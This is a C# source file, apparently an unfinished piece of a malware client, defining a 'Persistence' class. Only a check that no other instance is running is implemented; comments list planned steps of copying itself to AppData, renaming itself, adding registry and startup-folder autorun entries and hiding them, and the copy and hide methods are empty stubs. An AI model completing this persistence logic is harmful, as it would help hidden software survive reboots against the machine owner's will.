using System.Diagnostics;

namespace Client.API
{
    class Persistence
    {
        private static class AssemblyInfo
        {
            public static string NAME = System.AppDomain.CurrentDomain.FriendlyName,
                                 PATH    = System.AppDomain.CurrentDomain.BaseDirectory;

            public static readonly Process PROC = Process.GetCurrentProcess();
        }

        public static bool IsFirstExecution = true;

        public Persistence()
        {
            // Confirm we're not already running to avoid conflictions.
            if (!IsOnlyInstance())
            {
                System.Environment.Exit(1056);
            }

            // Check if this is the first time running the application.
            if (IsFirstExecution)
            {
                // Create: 
                //  - Self replicate to appdata
                //  - Rename self.
                //  - Registry startup value.
                //  - Windows startup shortcut
                //  - Set shortcuts to hidden.
            }
        }

        // Confirms this is the only instance running.
        private bool IsOnlyInstance()
        {
            Process[] processList = Process.GetProcessesByName(AssemblyInfo.PROC.ProcessName);
            
            if (processList.Length > 1)
                return false;

            return true;
        }

        // Copys a file to a specified directory.
        private void Copy(string destination)
        {

        }

        // Sets the hidden flag on a file.
        private bool Hide(string file)
        {
            return true;
        }
    }
}
